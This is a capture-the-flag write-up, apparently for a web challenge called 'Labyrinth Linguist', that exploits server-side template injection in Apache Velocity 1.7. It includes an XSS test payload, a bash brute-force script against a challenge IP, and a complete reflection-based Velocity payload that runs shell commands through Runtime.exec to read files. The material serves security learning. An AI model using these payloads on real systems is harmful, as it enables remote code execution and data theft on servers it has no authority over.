## Labyrinth Linguist

#### 1. Initial Recon

Simple page where user submits an input to be translated into the made up "voxalith" language.

After inputting a text, I inspect the html using DevTools and see that my text is simply inserted directly into to DOM:

```
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Labyrinth Linguist 🌐</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <form class="fire-form" action="" method="post">
        <span class="fire-form-text">Enter text to translate english to voxalith!</span><br><br>
        <input class="fire-form-input" type="text" name="text" value="">
        <input class="fire-form-button" type="submit" value="Submit →">
    </form>
    <h2 class="fire">hello</h2>  # my input "hello"
</body>
```

With this knowledge, we are likely dealing with an unsanitized input vulnerability.

#### 2. Injection Testing

The payload to test unsanitized JS inputs:

```
<script>alert('hello')</script>
```

This yields an alert message so we know that the input is not properly sanitized. This XSS vulnerability is a great step but is a client side vulnerability - we want to be able to interact with the server side to give us the contents of the flag.txt file so we will keep searching for other injection types.

After taking a look at the challenge files, the pom.xml file lets us know that the application is using a template service Apache Velocity v1.7 so we can look into a potential template injection vulnerability. What the template essential does for this service is replace any value containing "TEXT" with what we enter for the ?text parameter or the submission. 

To first test if template injection is possible, I will enter $name and if the page returns "world" the vulnerability is proved. The below lines in the main.java file show that the template is creating a variable "name" with "World" as its value:

```
t.setData(runtimeServices.parse(reader, "home"));
			t.initDocument();
			VelocityContext context = new VelocityContext();
			context.put("name", "World");
```

The test results: 

![nameVar](https://github.com/user-attachments/assets/7e8bce0d-b568-40f0-a214-0535db620e1a)

Great, we have proven SSTI, now to get the flag.

#### SSTI injection with Apache Velocity Template

So quick basics on Velocity tell me that $ marks variables and # marks commands. Here is the documentation for Velocity:

https://velocity.apache.org/engine/1.7/user-guide.html

So, the following:

```
#set ($run=1 + 1) $run 
```

Should put 2 on the page (in voxalaith). Let me try.

![testSet](https://github.com/user-attachments/assets/e1372a3d-3b0a-4fb1-aa3d-813b505d39f0)

As expected, the page rendered the value 2, so the above payload worked. Now how do we retrieve a file on the server?

After reading through the Velocity documentation, there is a directive (command) that will allow us to retrieve content on the server side. This magical directive is #include, the format for this directive is #include("/what/we/want"). To test this, we can first try getting files we know about like the pom.xml file.

Success, the contents of the pom file are outputted:

![pom](https://github.com/user-attachments/assets/0cb2b612-c655-4ea6-935b-2ab6091c97db)

But after playing around searching for the flag.txt and trying common directories, there is no luck.

entrypoint.sh tells us that they renamed the /flag.txt file to /flag**********.txt where the *** part comes from the following command:

```
# Change flag name
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
```

With this knowledge, I can create a brute force script that will try different combinations of /flag**********.txt until the http response is 200. 

The script:

```
#!/bin/bash

# Base URL
base_url="http://94.237.51.188:37293?text=%23include%28%22%2FflagHERE.txt%22%29" #url encoded

echo "Starting brute force..."

while true; do
    # Generate a random 10-character string
    random_string=$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10)

    # Replace "HERE" with the random string in the URL
    url=${base_url/HERE/$random_string}
    echo $url
    # Execute the curl command
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url")

    # Check if the status is 200
    if [ "$response" -eq 200 ]; then
        echo "Success! File found with URL: $url"
        echo "Check the url for the flag"
        exit 0
    fi
done

```

Ok, I'll admit, trying a brute force was pretty gung ho of me. The creators of this flag probably didn't envision a brute force method. Probably something with more touch.

After considerable research into SSTI with Apache Velocity, I came across an article on iwconnect.com (linked below) that provides excellent insight into the SSTI vulnerabilities with velocity by making use of Java within velocity affirmatives. This site also provided the payload necessary to find & read the flag. Below is the payload used:

```
#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat ../flag.txt"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
```

I used burpsuite repeater to make the request (and make countless other failed injection attempts) and get the flag in the response:

![flag](https://github.com/user-attachments/assets/0e539d37-5245-424e-88bc-1fcfb6691ae2)


#### Resources

- https://iwconnect.com/apache-velocity-server-side-template-injection/
- https://antgarsil.github.io/posts/velocity/
- https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
- https://velocity.apache.org/engine/1.7/user-guide.html
- https://portswigger.net/web-security/server-side-template-injection
